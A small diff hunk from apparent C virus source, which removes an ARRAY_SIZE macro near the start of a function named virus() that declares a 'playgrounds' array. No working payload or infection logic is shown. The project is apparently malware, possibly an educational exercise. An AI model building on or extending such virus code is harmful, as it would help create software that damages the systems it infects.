@@ -13,8 +13,6 @@
 #include "famine.h"
 #include "syscall.h"
 
-#define ARRAY_SIZE(x) (sizeof(x) / sizeof(*x))
-
 void	virus(void)
 {
 	const char *playgrounds[] =
